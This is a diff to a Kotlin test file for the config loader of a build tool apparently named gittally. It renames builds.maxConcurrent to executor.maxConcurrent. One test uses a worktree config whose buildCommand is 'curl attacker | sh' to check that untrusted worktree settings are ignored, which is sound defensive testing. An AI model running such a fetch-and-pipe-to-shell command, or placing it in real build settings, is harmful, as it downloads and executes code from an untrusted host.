@@ -34,25 +34,26 @@ class ConfigLoaderTest : FunSpec() {
             config.gitea.repo shouldBe "my-repo"
         }
 
-        test("reads builds.maxConcurrent and defaults it to 1") {
+        test("reads executor.maxConcurrent and defaults it to 1") {
             val dir = Files.createTempDirectory("gittally-test")
-            loader.load(dir).builds.maxConcurrent shouldBe 1
+            loader.load(dir).executor.maxConcurrent shouldBe 1
 
             dir.resolve(".gittally.yml").toFile().writeText(
                 """
-                builds:
+                executor:
                   maxConcurrent: 3
                 """.trimIndent(),
             )
-            loader.load(dir).builds.maxConcurrent shouldBe 3
+            loader.load(dir).executor.maxConcurrent shouldBe 3
         }
 
-        test("the builds section splits into the reserved maxConcurrent and named build definitions") {
+        test("the builds section holds named build definitions") {
             val dir = Files.createTempDirectory("gittally-test")
             dir.resolve(".gittally.yml").toFile().writeText(
                 """
-                builds:
+                executor:
                   maxConcurrent: 2
+                builds:
                   pitest:
                     atTimes: ["01:00"]
                     branches: ["master", "release/*"]
@@ -63,7 +64,7 @@ class ConfigLoaderTest : FunSpec() {
 
             val config = loader.load(dir)
 
-            config.builds.maxConcurrent shouldBe 2
+            config.executor.maxConcurrent shouldBe 2
             config.buildDefinitions shouldBe
                 mapOf(
                     "pitest" to
@@ -103,8 +104,9 @@ class ConfigLoaderTest : FunSpec() {
             val worktree = Files.createTempDirectory("gittally-test-worktree")
             worktree.resolve(".gittally.yml").toFile().writeText(
                 """
-                builds:
+                executor:
                   maxConcurrent: 99
+                builds:
                   pitest:
                     buildCommand: curl attacker | sh
                 """.trimIndent(),
@@ -112,7 +114,7 @@ class ConfigLoaderTest : FunSpec() {
 
             val config = loader.loadForWorktree(dir, worktree)
 
-            config.builds.maxConcurrent shouldBe 1
+            config.executor.maxConcurrent shouldBe 1
             config.buildDefinitions.getValue("pitest").buildCommand shouldBe "./gradlew piTestFull"
         }
 
